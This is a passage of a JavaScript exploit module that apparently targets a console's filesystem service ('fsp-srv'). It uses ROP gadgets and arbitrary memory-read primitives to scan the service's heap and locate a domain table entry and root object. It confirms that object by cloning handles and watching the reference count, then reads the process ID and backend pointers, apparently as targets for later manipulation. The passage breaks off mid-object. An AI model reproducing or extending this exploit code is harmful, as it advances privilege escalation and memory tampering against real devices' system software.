import coreRuntime from "./runtime.mjs";

// This factory captures only shared runtime functions, never payload-specific data.
export function createFspIdentityHelpers(options = {}) {
  const optimizeRootCandidateScan =
      options.optimizeRootCandidateScan === true;
  const collectRootScanTiming = options.collectRootScanTiming === true;
  const {
    AnalysisBytes,
    CachePlan,
    FRAME_SENTINEL,
    GADGET_MEMSET,
    MCPY,
    RootLayout,
    SEND,
    SETB,
    SIGNAL,
    SLEEP,
    TICK,
    WAIT,
    allocPage,
    call_rop,
    checkWindow,
    cloneObject,
    closeHandle,
    closeReservationGroup,
    cmifReply,
    collectSpans,
    executeWave,
    extractRoleTimings,
    frameArgSlot,
    hex32,
    ipcStorageRead,
    log,
    openDomainSession,
    openReservationGroup,
    prepPacket,
    qualifyOverlap,
    read32,
    read64,
    read8,
    readAllocationCounters,
    readFrameResult,
    resetWaveState,
    roleSendCode,
    sendIPC,
    ticksToUs,
    write32,
    write64,
    write8,
    writeDirtyData,
    writeStr,
    writeXDesc
  } = coreRuntime;
  async function inspectFspIdentityTargetsReadOnly(input) {
      const config = input.config;
      let addressPlan = input.addressPlan;
      let candidateHandle = input.candidateHandle;
      let domainSession = input.domainSession;
      let rootCandidateRetryable = input.rootCandidateRetryable;
      let rootPidRead = input.rootPidRead;
      let rootSession = input.rootSession;
      let verifiedIdentityTargets = input.verifiedIdentityTargets;
      const addressReadInput = {config, addressPlan, candidateHandle};
      let retainedCacheLayout = null;
      var retainedArrays = [];
      var retainedOwners = [];
      var retainedArraySeen = Object.create(null);
      var retainedOwnerSeen = Object.create(null);
      var retainedHeader0 = AnalysisBytes.readU64LE(addressPlan.bytes, 0);
      var retainedHeader1 = AnalysisBytes.readU64LE(addressPlan.bytes, 8);
      var rootTiming = {startedAt: collectRootScanTiming ? Date.now() : 0,
          clearMs: 0, readMs: 0,
          scanMs: 0, chunksRead: 0};

      function unusedCacheTail(bytes, start) {
          var tail = bytes.slice(start, start + 0x570);
          if (tail.length !== 0x570) return false;
          var any = false;
          for (var i = 0; i < tail.length; i++) any = any || !!tail[i];
          if (!any) return true;
          var pathStart;
          var exactEightBytePath = false;
          if (tail[0] === 0x41) pathStart = 0;
          else if (tail[0] === 0 && tail[1] === 0x41) pathStart = 1;
          else if (AnalysisBytes.toHex(tail, 0, 8) === "0000400100000000") {
              pathStart = 8;
              exactEightBytePath = true;
          } else if (AnalysisBytes.toHex(tail, 0, 5) === "0000400100")
              pathStart = tail[5] === 0 ? 6 : 5;
          else return false;
          var end = -1;
          for (var ti = pathStart; ti < tail.length; ti++) {
              if (tail[ti] === 0) { end = ti - pathStart; break; }
          }
          if (end <= 0 || (exactEightBytePath && end !== 552)) return false;
          var hasSlash = false;
          for (var pi = 0; pi < end; pi++) {
              var value = tail[pathStart + pi];
              if (value !== 0x41 && value !== 0x2F) return false;
              if (value === 0x2F) hasSlash = true;
          }
          if (!hasSlash) return false;
          for (var zi = pathStart + end; zi < tail.length; zi++)
              if (tail[zi] !== 0) return false;
          return true;
      }

      function rememberRetainedArray(address, bytes, offset) {
          if (offset < 0 || offset + 0x5A0 > bytes.length ||
              AnalysisBytes.readU64LE(bytes, offset) !== retainedHeader0 ||
              AnalysisBytes.readU64LE(bytes, offset + 8) !== retainedHeader1 ||
              bytes[offset + 0x10] !== 0 ||
              AnalysisBytes.readU64LE(bytes, offset + 0x18) !== 0n ||
              AnalysisBytes.readU64LE(bytes, offset + 0x20) !== 0n ||
              AnalysisBytes.readU64LE(bytes, offset + 0x28) !== 0n ||
              !unusedCacheTail(bytes, offset + 0x30)) return;
          var key = address.toString(16);
          if (retainedArraySeen[key]) return;
          retainedArraySeen[key] = true;
          retainedArrays.push({address, bytes: bytes.slice(offset, offset + 0x5A0)});
      }

      function rememberRetainedOwner(address, bytes, offset) {
          if (offset < 0 || offset + 0x78 > bytes.length ||
              AnalysisBytes.readU64LE(bytes, offset + 0x20) !==
                  BigInt(addressPlan.storageSize) ||
              AnalysisBytes.readU64LE(bytes, offset + 0x28) !== 0x4000n ||
              AnalysisBytes.readU64LE(bytes, offset + 0x50) !== 0x5A0n ||
              AnalysisBytes.readU32LE(bytes, offset + 0x58) !== 10 ||
              AnalysisBytes.readU64LE(bytes, offset + 0x60) !== 14n) return;
          var array = AnalysisBytes.readU64LE(bytes, offset + 0x48);
          if (array < 0x100000000n || array >= 0x8000000000n ||
              array % 8n !== 0n) return;
          var key = address.toString(16);
          if (retainedOwnerSeen[key]) return;
          retainedOwnerSeen[key] = true;
          retainedOwners.push({address, array: Number(array),
              bytes: bytes.slice(offset, offset + 0x78)});
      }

      function copyNativeBytes(pointer, length) {
          var bytes = new Array(length);
          if (!optimizeRootCandidateScan) {
              for (var i = 0; i < length; i++)
                  bytes[i] = Number(read8(pointer + BigInt(i)));
              return bytes;
          }
          var wordEnd = length - length % 8;
          for (var wordOffset = 0; wordOffset < wordEnd; wordOffset += 8) {
              var word = read64(pointer + BigInt(wordOffset));
              for (var byteIndex = 0; byteIndex < 8; byteIndex++) {
                  bytes[wordOffset + byteIndex] = Number(word & 0xFFn);
                  word >>= 8n;
              }
          }
          for (var tailOffset = wordEnd; tailOffset < length; tailOffset++)
              bytes[tailOffset] = Number(read8(pointer + BigInt(tailOffset)));
          return bytes;
      }

      function scanRetainedNativeChunk(buffer, chunkAddress, scanArrays) {
          var chunkLength = config.ROOT_CAPTURE_CHUNK;
          if (scanArrays) {
              for (var offset = 0; offset + 0x5A0 <= chunkLength; offset += 8) {
                  if (read64(buffer + BigInt(offset)) !== retainedHeader0 ||
                      read64(buffer + BigInt(offset + 8)) !== retainedHeader1 ||
                      Number(read8(buffer + BigInt(offset + 0x10))) !== 0 ||
                      read64(buffer + BigInt(offset + 0x18)) !== 0n ||
                      read64(buffer + BigInt(offset + 0x20)) !== 0n ||
                      read64(buffer + BigInt(offset + 0x28)) !== 0n) continue;
                  var tail = copyNativeBytes(buffer + BigInt(offset + 0x30), 0x570);
                  // Reuse the exact reference tail-shape guard on a compact local view.
                  var candidate = new Array(0x5A0);
                  for (var ti = 0; ti < tail.length; ti++)
                      candidate[0x30 + ti] = tail[ti];
                  if (!unusedCacheTail(candidate, 0x30)) continue;
                  rememberRetainedArray(chunkAddress + offset, [
                      ...copyNativeBytes(buffer + BigInt(offset), 0x30), ...tail
                  ], 0);
              }
          }
          for (var ownerOffset = 0; ownerOffset + 0x78 <= chunkLength;
              ownerOffset += 8) {
              if (read64(buffer + BigInt(ownerOffset + 0x20)) !==
                      BigInt(addressPlan.storageSize) ||
                  read64(buffer + BigInt(ownerOffset + 0x28)) !== 0x4000n ||
                  read64(buffer + BigInt(ownerOffset + 0x50)) !== 0x5A0n ||
                  Number(read32(buffer + BigInt(ownerOffset + 0x58))) !== 10 ||
                  read64(buffer + BigInt(ownerOffset + 0x60)) !== 14n) continue;
              var ownerBytes = copyNativeBytes(buffer + BigInt(ownerOffset), 0x78);
              rememberRetainedOwner(chunkAddress + ownerOffset,
                  ownerBytes, 0);
          }
      }

      function scanRetainedBoundary(previousTail, previousStart, buffer,
          chunkAddress) {
          if (!previousTail || previousTail.length !== 0x5A0) return;
          var boundary = previousTail.concat(copyNativeBytes(buffer, 0x5A0));
          for (var offset = 0; offset < 0x5A0; offset += 8)
              rememberRetainedArray(previousStart + offset, boundary, offset);
          var ownerStart = 0x5A0 - 0x78;
          for (var ownerOffset = ownerStart; ownerOffset < 0x5A0;
              ownerOffset += 8)
              rememberRetainedOwner(previousStart + ownerOffset, boundary,
                  ownerOffset);
      }

      const lookupResult = (ok) => ({ok,
          domainSession: ok ? domainSession : null,
          rootCandidateRetryable, rootPidRead,
          verifiedIdentityTargets: ok ? verifiedIdentityTargets : null,
          rootTiming: collectRootScanTiming ? {
              clearMs: rootTiming.clearMs,
              readMs: rootTiming.readMs,
              scanMs: rootTiming.scanMs,
              lookupMs: Math.max(0, Date.now() - rootTiming.startedAt -
                  rootTiming.clearMs - rootTiming.readMs - rootTiming.scanMs),
              chunksRead: rootTiming.chunksRead
          } : null});
      rootCandidateRetryable = false;
      await log("ROOT: begin separate-domain table inspection");
      var opened = openDomainSession();
      if (!opened) {
          await log("ROOT: separate domain session open failed");
          return lookupResult(false);
      }
      domainSession = opened;
      var cloneHandles = [];
      var verified = false;

      try {
          var domainId = Number(opened.rootObj) >>> 0;
          if (domainId === 0 || domainId > 0x4000) {
              await log("ROOT: invalid root domain ID=" + domainId);
              return lookupResult(false);
          }
          await log("ROOT: domain session handle=" + opened.handle +
              " rootId=" + domainId + "; current fsp-srv handle=" + rootSession +
              " retained; rootId derived from opened.rootObj on the same " +
              "openDomainSession() result as this handle");

          var anchor = Number(addressPlan.target);
          var captureStart = anchor - config.ROOT_CAPTURE_BACK;
          var captureEnd = captureStart + config.ROOT_CAPTURE_SIZE;
          var lowerStart = Number(addressPlan.lowerWindow.proposedStart);
          var startOffset = captureStart - Number(addressPlan.addressBias);
          var periodRemainder = Number(addressPlan.readOffset) % config.ROOT_CAPTURE_CHUNK;

          if (!Number.isSafeInteger(anchor) || !Number.isSafeInteger(captureStart) ||
              captureStart < 0x100000000 || captureEnd !== anchor - config.ROOT_CAPTURE_GAP ||
              !addressPlan.lowerWindow || addressPlan.lowerWindow.prefix < config.ROOT_CAPTURE_BACK ||
              captureStart < lowerStart || captureEnd > anchor || startOffset < 0 ||
              startOffset % config.ROOT_CAPTURE_CHUNK !== periodRemainder ||
              Math.floor(startOffset / config.CONTROL_SIZE) * config.CONTROL_SIZE %
                  config.ROOT_CAPTURE_CHUNK !== 0 ||
              startOffset + config.ROOT_CAPTURE_SIZE > addressPlan.storageSize ||
              config.ROOT_CAPTURE_CHUNKS !== 31) {
              await log("ROOT: bounded capture arithmetic rejected");
              return lookupResult(false);
          }

          await log("ROOT: bounded capture [0x" +
              captureStart.toString(16) + ",0x" + captureEnd.toString(16) +
              ") bytes=0x" + config.ROOT_CAPTURE_SIZE.toString(16) +
              " chunks=" + config.ROOT_CAPTURE_CHUNKS + " period=0x" +
              config.ROOT_CAPTURE_CHUNK.toString(16) + " anchor=0x" +
              anchor.toString(16));

          var captureBuf = allocPage(config.ROOT_CAPTURE_CHUNK + 0x2000);
          if (!captureBuf) {
              await log("ROOT: capture buffer allocation failed");
              return lookupResult(false);
          }
          var domainCandidates = [];
          var domainCandidateSeen = {};
          var carry = null;
          var retainedBoundaryTail = null;
          var retainedBoundaryAddress = 0;
          var captureChunksDone = 0;

          for (var chunkIndex = 0; chunkIndex < config.ROOT_CAPTURE_CHUNKS;
              chunkIndex++) {
              var chunkOffset = startOffset + chunkIndex * config.ROOT_CAPTURE_CHUNK;
              var chunkAddress = captureStart + chunkIndex * config.ROOT_CAPTURE_CHUNK;
              var bucketStart = Math.floor(chunkOffset / config.CONTROL_SIZE) *
                  config.CONTROL_SIZE;
              if (bucketStart % config.ROOT_CAPTURE_CHUNK !== 0 ||
                  chunkOffset % config.ROOT_CAPTURE_CHUNK !== periodRemainder ||
                  chunkOffset + config.ROOT_CAPTURE_CHUNK > addressPlan.storageSize) {
                  await log("ROOT: capture chunk bounds rejected index=" +
                      chunkIndex);
                  return lookupResult(false);
              }

              var clearStartedAt = collectRootScanTiming ? Date.now() : 0;
              call_rop(GADGET_MEMSET, captureBuf, 0xA5n,
                  BigInt(config.ROOT_CAPTURE_CHUNK));
              if (collectRootScanTiming)
                  rootTiming.clearMs += Date.now() - clearStartedAt;
              var readStartedAt = collectRootScanTiming ? Date.now() : 0;
              var captureReply = ipcStorageRead(candidateHandle, chunkOffset,
                  config.ROOT_CAPTURE_CHUNK, captureBuf);
              if (collectRootScanTiming)
                  rootTiming.readMs += Date.now() - readStartedAt;
              if (captureReply.error !== 0) {
                  await log("ROOT: capture read failed chunk=" +
                      chunkIndex + " rc=" + hex32(captureReply.error));
                  return lookupResult(false);
              }
              if (collectRootScanTiming) rootTiming.chunksRead++;
              var scanStartedAt = collectRootScanTiming ? Date.now() : 0;
              if (!hasByteDifferentFast(captureBuf,
                      config.ROOT_CAPTURE_CHUNK, 0xA5)) {
                  if (collectRootScanTiming)
                      rootTiming.scanMs += Date.now() - scanStartedAt;
                  await log("ROOT: capture chunk remained poison index=" +
                      chunkIndex);
                  return lookupResult(false);
              }

              scanRetainedBoundary(retainedBoundaryTail,
                  retainedBoundaryAddress, captureBuf, chunkAddress);
              if (!optimizeRootCandidateScan)
                  scanRetainedNativeChunk(captureBuf, chunkAddress, true);
              retainedBoundaryTail = copyNativeBytes(
                  captureBuf + BigInt(config.ROOT_CAPTURE_CHUNK - 0x5A0),
                  0x5A0);
              retainedBoundaryAddress = chunkAddress +
                  config.ROOT_CAPTURE_CHUNK - 0x5A0;

              var scanInput = {buffer: captureBuf,
                  chunkAddress, carry, candidates: domainCandidates,
                  seen: domainCandidateSeen, config,
                  scanRetainedArrays: optimizeRootCandidateScan,
                  retainedOwnerSize: BigInt(addressPlan.storageSize),
                  retainedHeader0, retainedHeader1,
                  rememberRetainedArray, rememberRetainedOwner,
                  copyNativeBytes};
              var scannedChunk = optimizeRootCandidateScan
                  ? scanRootDomainChunkPrefiltered(scanInput)
                  : scanRootDomainChunk(scanInput);
              domainCandidates = scannedChunk.candidates;
              domainCandidateSeen = scannedChunk.seen;
              carry = captureDomainTail({buffer: captureBuf, chunkAddress,
                  config, copyNativeBytes});
              captureChunksDone++;
              if (collectRootScanTiming)
                  rootTiming.scanMs += Date.now() - scanStartedAt;
              var progressChunk = Math.ceil(config.ROOT_CAPTURE_CHUNKS / 2);
              if (captureChunksDone === progressChunk &&
                  typeof input.reportProgress === "function") {
                  await input.reportProgress("FSP root capture and scan in progress: " +
                      captureChunksDone + "/" + config.ROOT_CAPTURE_CHUNKS +
                      " chunks; wrappers=" + domainCandidates.length +
                      "; cache arrays/owners=" + retainedArrays.length + "/" +
                      retainedOwners.length + ".");
              }
          }

          var retainedPairs = [];
          for (var retainedOwnerIndex = 0;
              retainedOwnerIndex < retainedOwners.length;
              retainedOwnerIndex++) {
              var retainedOwner = retainedOwners[retainedOwnerIndex];
              for (var retainedArrayIndex = 0;
                  retainedArrayIndex < retainedArrays.length;
                  retainedArrayIndex++) {
                  var retainedArray = retainedArrays[retainedArrayIndex];
                  if (retainedOwner.array === retainedArray.address)
                      retainedPairs.push({array: retainedArray.address,
                          owner: retainedOwner.address,
                          arrayBytes: retainedArray.bytes,
                          ownerBytes: retainedOwner.bytes});
              }
          }
          var retainedPairMap = Object.create(null);
          for (var retainedPairIndex = 0;
              retainedPairIndex < retainedPairs.length;
              retainedPairIndex++) {
              var retainedPair = retainedPairs[retainedPairIndex];
              retainedPairMap[retainedPair.array.toString(16) + ":" +
                  retainedPair.owner.toString(16)] = retainedPair;
          }
          var retainedPairKeys = Object.keys(retainedPairMap);
          if (retainedPairKeys.length === 1)
              retainedCacheLayout = {...retainedPairMap[retainedPairKeys[0]],
                  captureStart, captureEnd};
          await log("ROOT: retained cache scan arrays=" +
              retainedArrays.length + " owners=" + retainedOwners.length +
              " exactPairs=" + retainedPairKeys.length +
              (retainedCacheLayout ? " array=0x" +
                  retainedCacheLayout.array.toString(16) + " owner=0x" +
                  retainedCacheLayout.owner.toString(16) : ""));

          var groups = RootLayout.groupDomainCandidates(domainCandidates);
          await log("ROOT: capture complete bytes=0x" +
              config.ROOT_CAPTURE_SIZE.toString(16) + " wrappers=" +
              domainCandidates.length + " vtable-manager groups=" + groups.length);

          var tableMatches = [];
          for (var gi = 0; gi < groups.length; gi++) {
              var group = groups[gi];
              var groupDomainSample = group.domains.slice(0, 8).map(
                  function(item) { return "0x" + item.address.toString(16); }
              ).join(",");
              await log("ROOT TABLE: group=" + gi +
                  " domains=" + group.domains.length +
                  " domainSamples=" + (groupDomainSample || "none") +
                  " rootVptr=0x" + group.rootVptr.toString(16) +
                  " manager=0x" + group.manager.toString(16));
              if (!RootLayout.rangeContains(captureStart, config.ROOT_CAPTURE_SIZE,
                      group.manager, 0x20)) {
                  await log("ROOT TABLE: reject group=" + gi +
                      " stage=manager-bounds manager=0x" +
                      group.manager.toString(16) + " size=0x20 capture=[0x" +
                      captureStart.toString(16) + ",0x" +
                      captureEnd.toString(16) + ")");
                  continue;
              }

              await log("ROOT TABLE: group=" + gi +
                  " manager-read address=0x" + group.manager.toString(16) +
                  " size=0x20");
              var managerRead = await readFsAddressBytes({...addressReadInput,
                  address: group.manager, length: 0x20, outputBuf: captureBuf});
              if (!managerRead.ok) {
                  await log("ROOT TABLE: reject group=" + gi +
                      " stage=manager-read fatal=" + !!managerRead.fatal +
                      " error=" + managerRead.error);
                  if (managerRead.fatal) {
                      await log("ROOT: manager read failed: " +
                          managerRead.error);
                      return lookupResult(false);
                  }
                  continue;
              }
              var managerCount = AnalysisBytes.readU32LE(managerRead.bytes, 0x10);
              var tablePointer = AnalysisBytes.readU64LE(managerRead.bytes, 0x18);
              var managerCapacityOk = managerCount === 0x4000;
              var tablePointerCanonical = RootLayout.isCanonicalPointer(tablePointer);
              await log("ROOT TABLE: group=" + gi +
                  " manager-count=0x" + managerCount.toString(16) +
                  " expected=0x4000 ok=" + managerCapacityOk +
                  " table-pointer=0x" + tablePointer.toString(16) +
                  " canonical=" + tablePointerCanonical);
              if (!managerCapacityOk || !tablePointerCanonical) {
                  await log("ROOT TABLE: reject group=" + gi +
                      " stage=manager-capacity-or-table-pointer capacityOk=" +
                      managerCapacityOk + " pointerCanonical=" +
                      tablePointerCanonical);
                  continue;
              }
              var table = Number(tablePointer);
              var tableInCapture = RootLayout.rangeContains(captureStart,
                  config.ROOT_CAPTURE_SIZE, table, 0x4000);
              await log("ROOT TABLE: group=" + gi +
                  " table-bounds pointer=0x" + table.toString(16) +
                  " size=0x4000 inCapture=" + tableInCapture +
                  " capture=[0x" + captureStart.toString(16) + ",0x" +
                  captureEnd.toString(16) + ")");
              if (!tableInCapture) {
                  await log("ROOT TABLE: reject group=" + gi +
                      " stage=table-bounds");
                  continue;
              }

              var entryIndex = domainId - 1;
              var entryAddress = table + entryIndex * 0x30;
              var entryInCapture = RootLayout.rangeContains(captureStart,
                  config.ROOT_CAPTURE_SIZE, entryAddress, 0x30);
              var entryInTable = entryAddress >= table &&
                  entryAddress + 0x30 <= table + managerCount * 0x30;
              await log("ROOT TABLE: group=" + gi +
                  " rootId=" + domainId + " index=" + entryIndex +
                  " entry=0x" + entryAddress.toString(16) +
                  " size=0x30 inCapture=" + entryInCapture +
                  " inTable=" + entryInTable + " tableEnd=0x" +
                  (table + managerCount * 0x30).toString(16));
              if (!entryInCapture || !entryInTable) {
                  await log("ROOT TABLE: reject group=" + gi +
                      " stage=index-entry-bounds");
                  continue;
              }

              await log("ROOT TABLE: group=" + gi +
                  " entry-read address=0x" + entryAddress.toString(16) +
                  " size=0x30");
              var entryRead = await readFsAddressBytes({...addressReadInput,
                  address: entryAddress, length: 0x30, outputBuf: captureBuf});
              if (!entryRead.ok) {
                  await log("ROOT TABLE: reject group=" + gi +
                      " stage=entry-read fatal=" + !!entryRead.fatal +
                      " error=" + entryRead.error);
                  if (entryRead.fatal) {
                      await log("ROOT: domain-entry read failed: " +
                          entryRead.error);
                      return lookupResult(false);
                  }
                  continue;
              }
              var entryDomain = AnalysisBytes.readU64LE(entryRead.bytes, 0x18);
              var objectAddress = AnalysisBytes.readU64LE(entryRead.bytes, 0x20);
              var entryVptr = AnalysisBytes.readU64LE(entryRead.bytes, 0x28);
              var entryVptrDelta = entryVptr - BigInt(group.rootVptr);
              var entryVptrDeltaText = entryVptrDelta < 0n
                  ? "-0x" + (-entryVptrDelta).toString(16)
                  : "+0x" + entryVptrDelta.toString(16);
              await log("ROOT TABLE: group=" + gi +
                  " entry-values domain=0x" + entryDomain.toString(16) +
                  " object=0x" + objectAddress.toString(16) +
                  " classVptr=0x" + entryVptr.toString(16) +
                  " classVptrOffset=" + entryVptrDeltaText);
              var domainCandidate = null;
              for (var di = 0; di < group.domains.length; di++) {
                  if (BigInt(group.domains[di].address) === entryDomain) {
                      domainCandidate = group.domains[di];
                      break;
                  }
              }
              var domainAddressMatched = !!domainCandidate;
              var objectPointerCanonical = RootLayout.isCanonicalPointer(objectAddress);
              if (domainCandidate) {
                  await log("ROOT TABLE: matched-wrapper address=0x" +
                      domainCandidate.address.toString(16) +
                      " entryDomain=0x" + entryDomain.toString(16) +
                      " word+0x00=0x" + domainCandidate.first.toString(16) +
                      " word+0x08=0x" + domainCandidate.second.toString(16) +
                      " word+0x18=0x" + domainCandidate.manager.toString(16));
              }
              await log("ROOT TABLE: group=" + gi +
                  " entry-match domainInGroup=" + domainAddressMatched +
                  (domainCandidate ? " domainAddress=0x" +
                      domainCandidate.address.toString(16) : "") +
                  " objectCanonical=" + objectPointerCanonical +
                  " classVptrOffset=" + entryVptrDeltaText +
                  " classVptrIsDiagnosticOnly=true");
              if (!domainAddressMatched || !objectPointerCanonical) {
                  await log("ROOT TABLE: reject group=" + gi +
                      " stage=owned-root-entry-owner-or-object-pointer");
                  continue;
              }

              await log("ROOT TABLE: group=" + gi +
                  " domain-wrapper-read address=0x" +
                  domainCandidate.address.toString(16) + " size=0x20");
              var wrapperRead = await readFsAddressBytes({...addressReadInput,
                  address: domainCandidate.address, length: 0x20,
                  outputBuf: captureBuf});
              if (!wrapperRead.ok) {
                  await log("ROOT TABLE: reject group=" + gi +
                      " stage=domain-wrapper-read fatal=" + !!wrapperRead.fatal +
                      " error=" + wrapperRead.error);
                  if (wrapperRead.fatal) {
                      await log("ROOT: domain-wrapper read failed: " +
                          wrapperRead.error);
                      return lookupResult(false);
                  }
                  continue;
              }
              var wrapperVptr0 = AnalysisBytes.readU64LE(wrapperRead.bytes, 0);
              var wrapperVptr1 = AnalysisBytes.readU64LE(wrapperRead.bytes, 8);
              var wrapperManager = AnalysisBytes.readU64LE(wrapperRead.bytes, 0x18);
              var expectedWrapperVptr0 = BigInt(group.rootVptr + 0x28e0);
              var expectedWrapperVptr1 = BigInt(group.rootVptr + 0x2938);
              var wrapperVptr0Matched = wrapperVptr0 === expectedWrapperVptr0;
              var wrapperVptr1Matched = wrapperVptr1 === expectedWrapperVptr1;
              var wrapperManagerMatched = wrapperManager === BigInt(group.manager);
              await log("ROOT TABLE: group=" + gi +
                  " wrapper-layout vptr0=0x" + wrapperVptr0.toString(16) +
                  " expected0=0x" + expectedWrapperVptr0.toString(16) +
                  " match0=" + wrapperVptr0Matched +
                  " vptr1=0x" + wrapperVptr1.toString(16) +
                  " expected1=0x" + expectedWrapperVptr1.toString(16) +
                  " match1=" + wrapperVptr1Matched +
                  " manager=0x" + wrapperManager.toString(16) +
                  " expectedManager=0x" + group.manager.toString(16) +
                  " managerMatch=" + wrapperManagerMatched);
              if (!wrapperVptr0Matched || !wrapperVptr1Matched ||
                  !wrapperManagerMatched) {
                  await log("ROOT TABLE: reject group=" + gi +
                      " stage=wrapper-vtables-manager");
                  continue;
              }

              tableMatches.push({domainId: domainId, entry: entryAddress,
                  domain: domainCandidate.address, object: Number(objectAddress),
                  manager: group.manager, table: table,
                  rootVptr: group.rootVptr, entryBytes: entryRead.bytes});
              await log("ROOT TABLE: group=" + gi +
                  " produced coherent entry=0x" + entryAddress.toString(16));
          }

          await log("ROOT TABLE: lookup summary rootId=" +
              domainId + " groups=" + groups.length + " matches=" +
              tableMatches.length);
          if (tableMatches.length !== 1) {
              await log("ROOT: domain table lookup=" +
                  (tableMatches.length === 0 ? "no match" : "ambiguous") +
                  " matches=" + tableMatches.length);
              // The address read itself was valid, but this capture did not
              // identify one table entry for the session's domain ID. A later
              // bounded candidate capture may cover the correct heap region.
              rootCandidateRetryable = true;
              return lookupResult(false);
          }

          var located = tableMatches[0];
          await log("ROOT: entry id=" + located.domainId +
              " at=0x" + located.entry.toString(16) +
              " domain=0x" + located.domain.toString(16) +
              " object=0x" + located.object.toString(16) +
              " manager=0x" + located.manager.toString(16) +
              " table=0x" + located.table.toString(16) +
              " classVptr=0x" +
              AnalysisBytes.readU64LE(located.entryBytes, 0x28).toString(16));

          var rootRead = await readFsAddressBytes({...addressReadInput,
              address: located.object, length: 0x40, outputBuf: captureBuf});
          if (!rootRead.ok) {
              await log("ROOT: object read failed: " + rootRead.error);
              if (!rootRead.fatal) rootCandidateRetryable = true;
              return lookupResult(false);
          }
          var rootBytes = rootRead.bytes;
          var rootObjectVptr = AnalysisBytes.readU64LE(rootBytes, 0);
          var rootRefCount = AnalysisBytes.readU32LE(rootBytes, 0x38);
          if (rootObjectVptr !== BigInt(located.rootVptr) ||
              rootRefCount === 0 || rootRefCount >= 0x1000000) {
              await log("ROOT: object layout rejected vptr=0x" +
                  rootObjectVptr.toString(16) + " ref=0x" +
                  rootRefCount.toString(16));
              rootCandidateRetryable = true;
              return lookupResult(false);
          }
          await log("ROOT: object vptr=0x" +
              rootObjectVptr.toString(16) + " ref=0x" +
              rootRefCount.toString(16));

          var liveBaseline = rootBytes.slice();
          var expectedCount = rootRefCount + 3;
          var cloneOpened = true;
          var challengeOnlyCounter = false;
          var challengeRestored = false;
          var cloneCloseOk = true;
          if (expectedCount > 0xFFFFFFFF) cloneOpened = false;

          try {
              if (cloneOpened) {
                  for (var cloneIndex = 0; cloneIndex < 3; cloneIndex++) {
                      var cloneHandle = cloneObject(opened.handle, domainId);
                      if (!cloneHandle) {
                          cloneOpened = false;
                          await log("ROOT: clone open failed index=" +
                              cloneIndex);
                          break;
                      }
                      cloneHandles.push(cloneHandle);
                  }
              }

              if (cloneOpened && cloneHandles.length === 3) {
                  var duringRead = await readFsAddressBytes({...addressReadInput,
                      address: located.object, length: 0x40,
                      outputBuf: captureBuf});
                  if (duringRead.ok) {
                      var expectedDuring = liveBaseline.slice();
                      AnalysisBytes.writeU32LE(expectedDuring, 0x38, expectedCount);
                      challengeOnlyCounter = AnalysisBytes.equal(duringRead.bytes,
                          expectedDuring);
                      await log("ROOT: clone challenge before=0x" +
                          rootRefCount.toString(16) + " during=0x" +
                          AnalysisBytes.readU32LE(duringRead.bytes, 0x38).toString(16) +
                          " expected=0x" + expectedCount.toString(16) +
                          " onlyRefcount=" + challengeOnlyCounter);
                  } else {
                      await log("ROOT: clone challenge read failed: " +
                          duringRead.error);
                  }
              }
          } finally {
              var challengedClones = cloneHandles.length;
              var failedCloneCloses = [];
              var stillOpenClones = [];
              for (var closeIndex = cloneHandles.length - 1;
                  closeIndex >= 0; closeIndex--) {
                  var challengedHandle = cloneHandles[closeIndex];
                  var closeResult = Number(closeHandle(
                      challengedHandle)) >>> 0;
                  if (closeResult !== 0) {
                      cloneCloseOk = false;
                      failedCloneCloses.push(hex32(closeResult));
                      stillOpenClones.push(challengedHandle);
                  }
              }
              cloneHandles = stillOpenClones;
              await log("ROOT: challenge clones closed=" +
                  challengedClones + " errors=" +
                  (failedCloneCloses.join(",") || "none"));
          }

          var restoredRead = await readFsAddressBytes({...addressReadInput,
              address: located.object, length: 0x40, outputBuf: captureBuf});
          if (restoredRead.ok)
              challengeRestored = AnalysisBytes.equal(restoredRead.bytes,
                  liveBaseline);
          await log("ROOT: clone restore=" + challengeRestored +
              " closeOk=" + cloneCloseOk + " exactBytes=" +
              (restoredRead.ok && challengeRestored));

          if (!challengeRestored || !cloneCloseOk) {
              await log("ROOT: clone proof did not restore cleanly; " +
                  "PID and backend reads skipped");
              return lookupResult(false);
          }
          if (!challengeOnlyCounter) {
              await log("ROOT: clone proof changed unexpected bytes; " +
                  "PID and backend reads skipped");
              rootCandidateRetryable = true;
              return lookupResult(false);
          }

          var rootPid = AnalysisBytes.readU64LE(liveBaseline, 0x30);
          rootPidRead = true;
          var rootPidPlausible = rootPid > 1n && rootPid < 0x1000000n;
          await log("ROOT: clone proof passed; PID=0x" +
              rootPid.toString(16) + " plausible=" + rootPidPlausible);
          if (!rootPidPlausible) {
              await log("ROOT: implausible PID; backend links and " +
                  "PID fields skipped");
              return lookupResult(false);
          }

          var backendChecksOk = true;
          var backendResults = [];
          var ncaRaw = AnalysisBytes.readU64LE(rootBytes, 0x10);
          var ncaControl = AnalysisBytes.readU64LE(rootBytes, 0x18);
          var saveRaw = AnalysisBytes.readU64LE(rootBytes, 0x20);
          var saveControl = AnalysisBytes.readU64LE(rootBytes, 0x28);
          backendResults.push(await inspectRootBackend("nca", ncaRaw,
              ncaControl, 0x20, rootPid, captureBuf, addressReadInput));
          backendResults.push(await inspectRootBackend("save", saveRaw,
              saveControl, 0x28, rootPid, captureBuf, addressReadInput));
          for (var backendIndex = 0; backendIndex < backendResults.length;
              backendIndex++) {
              var backendResult = backendResults[backendIndex];
              if (!backendResult.read || !backendResult.linksOk ||
                  !backendResult.vptrShapeOk || !backendResult.pidOk ||
                  !backendResult.stable) backendChecksOk = false;
          }

          var rootFinalRead = await readFsAddressBytes({...addressReadInput,
              address: located.object, length: 0x40, outputBuf: captureBuf});
          var rootStable = rootFinalRead.ok &&
              AnalysisBytes.equal(rootFinalRead.bytes, liveBaseline);
          await log("ROOT: final identity reread ok=" +
              rootFinalRead.ok + " byteStable=" + rootStable +
              " pidUnchanged=" + (rootStable &&
                  AnalysisBytes.readU64LE(rootFinalRead.bytes, 0x30) === rootPid));

          verified = rootPidPlausible && challengeOnlyCounter &&
              challengeRestored && cloneCloseOk && rootStable &&
              backendResults.length === 2 && backendChecksOk;
          if (verified) {
              verifiedIdentityTargets = {
                  domainId: domainId,
                  retainedCache: retainedCacheLayout,
                  domainLayout: {
                      domainId: located.domainId,
                      entry: located.entry,
                      domain: located.domain,
                      object: located.object,
                      manager: located.manager,
                      table: located.table,
                      rootVptr: located.rootVptr,
                      entryBytes: Array.from(located.entryBytes),
                      captureStart: captureStart,
                      captureEnd: captureEnd
                  },
                  fields: [
                      {name: "root", object: Number(located.object),
                          objectSize: 0x40, pidOffset: 0x30,
